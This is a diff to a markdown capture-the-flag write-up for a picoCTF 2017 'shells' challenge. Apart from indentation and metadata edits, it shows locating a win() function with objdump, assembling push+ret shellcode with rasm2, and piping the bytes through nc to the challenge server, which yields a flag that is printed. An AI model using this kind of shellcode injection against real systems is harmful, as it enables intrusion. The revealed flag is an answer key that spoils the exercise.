@@ -104,9 +104,9 @@ Just see their iss one  `win()`  function. Lets take a look on win() function in
     objdump -d shells | grep win
     08048540 <win>:
     
-    We got the address in Hex we used to write it in this way  `0x08048540`.
+We got the address in Hex we used to write it in this way  `0x08048540`.
     
-    Now we can use  [radare2](https://github.com/radare/radare2)  to generate our payload. Actually we need  `push+ret`  in order to make our payload.
+Now we can use  [radare2](https://github.com/radare/radare2)  to generate our payload. Actually we need  `push+ret`  in order to make our payload.
     
     $rasm2 -C "push 0x08048540"
     "\x68\x40\x85\x04\x08"
@@ -121,9 +121,9 @@ Now print this shellcode in one file name:  `spirit_shells`.
 
  python -c 'print "\x68\x40\x85\x04\x08\xc3"' > spirit_shells
 
-now just cat it out with the : shell2017.picoctf.com:17533
+now just cat it out with the : shell2017.picoctf.com:63545
 
-$cat spirit_shells - | nc shell2017.picoctf.com 17533
+$cat spirit_shells - | nc shell2017.picoctf.com 63545
  My mother told me to never accept things from strangers
  How bad could running a couple bytes be though?
  Give me 10 bytes:
@@ -133,6 +133,5 @@ So, i think we got the flag  `4350d27b024f8597f10b98f164f0fc43`.
 
 Hope you liked it
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyODY1MzAyOTQsLTEyMzQ3MDQyODhdfQ
-==
+eyJoaXN0b3J5IjpbMTAyMjM5OTE3OCwtMTIzNDcwNDI4OF19
 -->
